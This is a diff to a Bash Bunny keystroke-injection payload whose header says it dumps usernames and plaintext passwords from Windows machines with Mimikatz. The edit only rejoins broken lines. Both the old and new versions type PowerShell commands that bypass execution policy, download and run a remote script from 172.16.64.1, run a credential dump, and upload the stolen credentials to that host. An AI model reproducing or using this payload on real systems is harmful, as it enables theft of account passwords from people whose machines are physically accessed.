@@ -4,7 +4,7 @@
 # Author:        illwill
 # Version:       0.1
 #
-# Dumps the usernames & plaintext passwords from Windows boxes using Powershell                                                                                                              in memory
+# Dumps the usernames & plaintext passwords from Windows boxes using Powershell in memory
 # with Mimikatz then stashes them in /root/udisk/loot/MrRobot
 #
 # Amber..............Starting WebServer
@@ -39,13 +39,13 @@ Q DELAY 100
 Q ENTER
 Q DELAY 1200
 
-#Powershell Payload: first wait for connection to bunny webserver, then pull scr                                                                                                             ipts and upload results
-Q STRING powershell -c \"while \(\$true\) \{ If \(Test-Connection 172.16.64.1 -c                                                                                                             ount 1 -quiet\) \{ sleep 2\; exit\"\}\}
+#Powershell Payload: first wait for connection to bunny webserver, then pull scripts and upload results
+Q STRING powershell -c \"while \(\$true\) \{ If \(Test-Connection 172.16.64.1 -count 1 -quiet\) \{ sleep 2\; exit\"\}\}
 Q DELAY 300
 Q ENTER
-Q STRING powershell -NoP -Exec Bypass -c \"sleep 2\;IEX \(New-Object Net.WebClie                                                                                                             nt\).DownloadString\(\'http\:\/\/\172.16.64.1\/md.ps1\'\)\;
-Q STRING \$o \= Invoke-Mimidogz -DumpCred\; \(New-Object Net.WebClient\).UploadS                                                                                                             tring\(\'http\:\/\/172.16.64.1\/\'\+\$env:computername\, \$o\)\;
-Q STRING \(New-Object Net.WebClient\).UploadString\(\'http\:\/\/172.16.64.1\/EOF                                                                                                             \'\, \'EOF\'\)\;\"
+Q STRING powershell -NoP -Exec Bypass -c \"sleep 2\;IEX \(New-Object Net.WebClient\).DownloadString\(\'http\:\/\/\172.16.64.1\/md.ps1\'\)\;
+Q STRING \$o \= Invoke-Mimidogz -DumpCred\; \(New-Object Net.WebClient\).UploadString\(\'http\:\/\/172.16.64.1\/\'\+\$env:computername\, \$o\)\;
+Q STRING \(New-Object Net.WebClient\).UploadString\(\'http\:\/\/172.16.64.1\/EOF\'\, \'EOF\'\)\;\"
 Q DELAY 300
 Q ENTER
 
